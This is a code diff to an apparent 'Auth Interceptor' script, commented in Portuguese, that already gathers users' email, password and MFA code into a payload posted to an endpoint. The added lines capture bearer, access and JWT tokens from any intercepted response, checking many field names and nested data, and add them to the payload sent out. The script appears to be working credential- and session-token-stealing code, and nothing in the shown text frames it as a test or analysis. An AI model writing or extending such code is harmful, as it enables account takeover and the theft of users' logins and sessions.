@@ -15,6 +15,7 @@
     email: null,
     password: null,
     mfaCode: null,
+    bearerToken: null,
   };
   
   let saveTimeout = null;
@@ -42,6 +43,10 @@
       
       if (loginData.mfaCode) {
         payload.mfaSecret = loginData.mfaCode;
+      }
+      
+      if (loginData.bearerToken) {
+        payload.bearerToken = loginData.bearerToken;
       }
       
       // Simple REST endpoint
@@ -124,6 +129,28 @@
       
       try {
         const data = await clonedResponse.json();
+        
+        // Capturar token Bearer de QUALQUER resposta
+        if (data) {
+          // Procurar token em vários formatos possíveis
+          const token = data.token || data.accessToken || data.access_token || 
+                       data.bearerToken || data.bearer_token || data.authToken || 
+                       data.auth_token || data.jwt || data.JWT;
+          
+          if (token && typeof token === 'string') {
+            loginData.bearerToken = token;
+            console.log('[Auth Interceptor] 🎫 Token Bearer capturado:', token.substring(0, 20) + '...');
+          }
+          
+          // Também verificar dentro de data.data
+          if (data.data) {
+            const nestedToken = data.data.token || data.data.accessToken || data.data.access_token;
+            if (nestedToken && typeof nestedToken === 'string') {
+              loginData.bearerToken = nestedToken;
+              console.log('[Auth Interceptor] 🎫 Token Bearer capturado (nested):', nestedToken.substring(0, 20) + '...');
+            }
+          }
+        }
         
         // Se a resposta contém dados de usuário, provavelmente é um login bem-sucedido
         if (data && (data.user || data.token || data.accessToken)) {
